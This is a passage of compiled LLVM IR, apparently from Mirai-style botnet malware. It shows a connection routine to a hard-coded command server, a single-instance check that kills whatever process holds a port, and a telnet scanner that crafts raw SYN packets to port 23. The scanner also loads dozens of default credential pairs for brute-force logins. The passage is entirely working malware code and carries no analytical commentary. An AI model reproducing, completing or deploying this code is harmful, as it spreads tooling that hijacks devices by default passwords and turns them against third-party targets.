  %21 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %1, i64 0, i32 1
  store i16 %20, i16* %21, align 2
  %22 = tail call i32* @__errno_location() #11
  store i32 0, i32* %22, align 4
  %23 = load i32, i32* @fd_ctrl, align 4
  %24 = bitcast %struct.sockaddr_in* %1 to %struct.sockaddr*
  %25 = call i32 @bind(i32 %23, %struct.sockaddr* nonnull %24, i32 16) #9
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %39

; <label>:27:                                     ; preds = %17
  %28 = load i32, i32* %22, align 4
  %29 = icmp eq i32 %28, 99
  br i1 %29, label %30, label %32

; <label>:30:                                     ; preds = %27
  %.b = load i1, i1* @ensure_single_instance.local_bind, align 1
  br i1 %.b, label %32, label %31

; <label>:31:                                     ; preds = %30
  store i1 true, i1* @ensure_single_instance.local_bind, align 1
  br label %32

; <label>:32:                                     ; preds = %30, %31, %27
  store i16 2, i16* %12, align 4
  store i32 0, i32* %19, align 4
  store i16 %20, i16* %21, align 2
  %33 = load i32, i32* @fd_ctrl, align 4
  %34 = call i32 @connect(i32 %33, %struct.sockaddr* nonnull %24, i32 16) #9
  %35 = call i32 @sleep(i32 5) #9
  %36 = load i32, i32* @fd_ctrl, align 4
  %37 = call i32 @close(i32 %36) #9
  %38 = call signext i8 @killer_kill_by_port(i16 zeroext %20) #9
  call fastcc void @ensure_single_instance()
  br label %42

; <label>:39:                                     ; preds = %17
  %40 = load i32, i32* @fd_ctrl, align 4
  %41 = call i32 @listen(i32 %40, i32 1) #9
  br label %42

; <label>:42:                                     ; preds = %0, %39, %32
  ret void
}

declare void @rand_init() local_unnamed_addr #2

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #4

declare i32 @util_strlen(i8*) local_unnamed_addr #2

declare i32 @util_strcpy(i8*, i8*) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @prctl(i32, ...) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @fork() local_unnamed_addr #1

; Function Attrs: noreturn nounwind
declare void @exit(i32) local_unnamed_addr #5

; Function Attrs: nounwind
declare i32 @setsid() local_unnamed_addr #1

declare i32 @close(i32) local_unnamed_addr #2

declare signext i8 @attack_init() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @establish_connection() unnamed_addr #3 {
  %1 = tail call i32 @socket(i32 2, i32 1, i32 0) #9
  store i32 %1, i32* @fd_serv, align 4
  %2 = icmp eq i32 %1, -1
  br i1 %2, label %11, label %3

; <label>:3:                                      ; preds = %0
  store i16 2, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i64 0, i32 0), align 4
  %4 = tail call i32 @htonl(i32 -1335130672) #11
  store i32 %4, i32* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i64 0, i32 2, i32 0), align 4
  %5 = tail call zeroext i16 @htons(i16 zeroext 1024) #11
  store i16 %5, i16* getelementptr inbounds (%struct.sockaddr_in, %struct.sockaddr_in* @srv_addr, i64 0, i32 1), align 2
  %6 = tail call i32 (i32, i32, ...) @fcntl(i32 %1, i32 3, i32 0) #9
  %7 = or i32 %6, 2048
  %8 = tail call i32 (i32, i32, ...) @fcntl(i32 %1, i32 4, i32 %7) #9
  store i8 1, i8* @pending_connection, align 1
  %9 = load i32, i32* @fd_serv, align 4
  %10 = tail call i32 @connect(i32 %9, %struct.sockaddr* bitcast (%struct.sockaddr_in* @srv_addr to %struct.sockaddr*), i32 16) #9
  br label %11

; <label>:11:                                     ; preds = %0, %3
  ret void
}

declare i32 @select(i32, %struct.__sigset_t*, %struct.__sigset_t*, %struct.__sigset_t*, %struct.timeval*) local_unnamed_addr #2

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #2

declare i32 @accept(i32, %struct.sockaddr*, i32*) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @kill(i32, i32) local_unnamed_addr #1

declare void @attack_kill_all() local_unnamed_addr #2

; Function Attrs: noinline nounwind uwtable
define internal fastcc void @teardown_connection() unnamed_addr #3 {
  %1 = load i32, i32* @fd_serv, align 4
  %2 = icmp eq i32 %1, -1
  br i1 %2, label %5, label %3

; <label>:3:                                      ; preds = %0
  %4 = tail call i32 @close(i32 %1) #9
  br label %5

; <label>:5:                                      ; preds = %0, %3
  store i32 -1, i32* @fd_serv, align 4
  %6 = tail call i32 @sleep(i32 1) #9
  ret void
}

; Function Attrs: nounwind
declare i32 @getsockopt(i32, i32, i32, i8*, i32*) local_unnamed_addr #1

declare i32 @rand_next() local_unnamed_addr #2

declare i32 @sleep(i32) local_unnamed_addr #2

declare i32 @util_local_addr() local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare i32* @__errno_location() local_unnamed_addr #6

declare i64 @recv(i32, i8*, i64, i32) local_unnamed_addr #2

; Function Attrs: nounwind readnone
declare zeroext i16 @ntohs(i16 zeroext) local_unnamed_addr #6

declare void @attack_parse(i8*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @socket(i32, i32, i32) local_unnamed_addr #1

; Function Attrs: nounwind readnone
declare i32 @htonl(i32) local_unnamed_addr #6

; Function Attrs: nounwind readnone
declare zeroext i16 @htons(i16 zeroext) local_unnamed_addr #6

declare i32 @fcntl(i32, i32, ...) local_unnamed_addr #2

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @setsockopt(i32, i32, i32, i8*, i32) local_unnamed_addr #1

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

declare signext i8 @killer_kill_by_port(i16 zeroext) local_unnamed_addr #2

; Function Attrs: nounwind
declare i32 @listen(i32, i32) local_unnamed_addr #1

; Function Attrs: noinline nounwind uwtable
define void @scanner_init() local_unnamed_addr #3 {
  %1 = alloca i32, align 4
  %2 = alloca %struct.__sigset_t, align 8
  %3 = alloca %struct.__sigset_t, align 8
  %4 = alloca <2 x i64>, align 16
  %tmpcast = bitcast <2 x i64>* %4 to %struct.timeval*
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca [1514 x i8], align 16
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = tail call i32 @fork() #9
  store i32 %9, i32* @scanner_pid, align 4
  %10 = icmp sgt i32 %9, 0
  %11 = icmp eq i32 %9, -1
  %or.cond = or i1 %10, %11
  br i1 %or.cond, label %12, label %13

; <label>:12:                                     ; preds = %0
  ret void

; <label>:13:                                     ; preds = %0
  %14 = tail call i32 @util_local_addr() #9
  store i32 %14, i32* @LOCAL_ADDR, align 4
  tail call void @rand_init() #9
  %15 = tail call i64 @time(i64* null) #9
  %16 = trunc i64 %15 to i32
  store i32 %16, i32* @fake_time, align 4
  %17 = tail call noalias i8* @calloc(i64 628, i64 8264) #9
  %18 = bitcast i8* %17 to %struct.scanner_connection*
  store i32 0, i32* %1, align 4
  br label %19

; <label>:19:                                     ; preds = %19, %13
  %indvars.iv307 = phi i64 [ 0, %13 ], [ %indvars.iv.next308.3, %19 ]
  %20 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv307, i32 2
  store i32 -1, i32* %20, align 8
  %indvars.iv.next308 = or i64 %indvars.iv307, 1
  %21 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv.next308, i32 2
  store i32 -1, i32* %21, align 8
  %indvars.iv.next308.1 = or i64 %indvars.iv307, 2
  %22 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv.next308.1, i32 2
  store i32 -1, i32* %22, align 8
  %indvars.iv.next308.2 = or i64 %indvars.iv307, 3
  %23 = getelementptr inbounds %struct.scanner_connection, %struct.scanner_connection* %18, i64 %indvars.iv.next308.2, i32 2
  store i32 -1, i32* %23, align 8
  %indvars.iv.next308.3 = add nsw i64 %indvars.iv307, 4
  %exitcond.3 = icmp eq i64 %indvars.iv.next308.3, 628
  br i1 %exitcond.3, label %24, label %19

; <label>:24:                                     ; preds = %19
  store i32 628, i32* %1, align 4
  %25 = tail call i32 @socket(i32 2, i32 3, i32 6) #9
  store i32 %25, i32* @rsck, align 4
  %26 = icmp eq i32 %25, -1
  br i1 %26, label %27, label %28

; <label>:27:                                     ; preds = %24
  tail call void @exit(i32 0) #10
  unreachable

; <label>:28:                                     ; preds = %24
  %29 = tail call i32 (i32, i32, ...) @fcntl(i32 %25, i32 3, i32 0) #9
  %30 = or i32 %29, 2048
  %31 = tail call i32 (i32, i32, ...) @fcntl(i32 %25, i32 4, i32 %30) #9
  store i32 1, i32* %1, align 4
  %32 = load i32, i32* @rsck, align 4
  %33 = bitcast i32* %1 to i8*
  %34 = call i32 @setsockopt(i32 %32, i32 0, i32 3, i8* nonnull %33, i32 4) #9
  %35 = icmp eq i32 %34, 0
  br i1 %35, label %.preheader270.preheader, label %36

.preheader270.preheader:                          ; preds = %28
  br label %.preheader270

; <label>:36:                                     ; preds = %28
  %37 = load i32, i32* @rsck, align 4
  %38 = call i32 @close(i32 %37) #9
  call void @exit(i32 0) #10
  unreachable

.preheader270:                                    ; preds = %.preheader270.preheader, %.preheader270
  %39 = call i32 @rand_next() #9
  %40 = trunc i32 %39 to i16
  %41 = call zeroext i16 @ntohs(i16 zeroext %40) #11
  %42 = icmp ult i16 %41, 1024
  br i1 %42, label %.preheader270, label %43

; <label>:43:                                     ; preds = %.preheader270
  store i8 69, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 0), align 16
  %44 = call zeroext i16 @htons(i16 zeroext 40) #11
  store i16 %44, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 2) to i16*), align 2
  %45 = call i32 @rand_next() #9
  %46 = trunc i32 %45 to i16
  store i16 %46, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 4) to i16*), align 4
  store i8 64, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 8), align 8
  store i8 6, i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 9), align 1
  %47 = call zeroext i16 @htons(i16 zeroext 23) #11
  store i16 %47, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 22) to i16*), align 2
  store i16 %40, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 20) to i16*), align 4
  %48 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %49 = and i16 %48, -241
  %50 = or i16 %49, 80
  store i16 %50, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %51 = call i32 @rand_next() #9
  %52 = trunc i32 %51 to i16
  store i16 %52, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 34) to i16*), align 2
  %53 = load i16, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  %54 = or i16 %53, 512
  store i16 %54, i16* bitcast (i8* getelementptr inbounds ([40 x i8], [40 x i8]* @scanner_rawpkt, i64 0, i64 32) to i16*), align 16
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.22, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.23, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.25, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0), i16 zeroext 15)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.28, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.29, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.30, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.31, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.32, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.34, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.37, i64 0, i64 0), i16 zeroext 8)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.38, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.39, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.41, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.42, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.43, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.44, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.45, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.48, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.49, i64 0, i64 0), i16 zeroext 16)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.50, i64 0, i64 0), i16 zeroext 16)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.53, i64 0, i64 0), i16 zeroext 17)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.35, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.54, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.57, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.51, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.26, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.52, i64 0, i64 0), i16 zeroext 9)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.21, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.59, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.62, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.63, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.64, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.65, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.66, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.67, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.68, i64 0, i64 0), i8* getelementptr inbounds ([1 x i8], [1 x i8]* @.str.24, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.70, i64 0, i64 0), i16 zeroext 4)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.71, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.72, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.73, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.58, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.74, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i64 0, i64 0), i16 zeroext 2)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i16 zeroext 10)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.76, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.77, i64 0, i64 0), i16 zeroext 8)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.36, i64 0, i64 0), i16 zeroext 1)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.78, i64 0, i64 0), i16 zeroext 3)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.75, i64 0, i64 0), i16 zeroext 7)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.60, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.56, i64 0, i64 0), i16 zeroext 15)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.55, i64 0, i64 0), i16 zeroext 12)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.79, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.80, i64 0, i64 0), i16 zeroext 5)
  call fastcc void @add_auth_entry(i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.20, i64 0, i64 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.61, i64 0, i64 0), i16 zeroext 7)
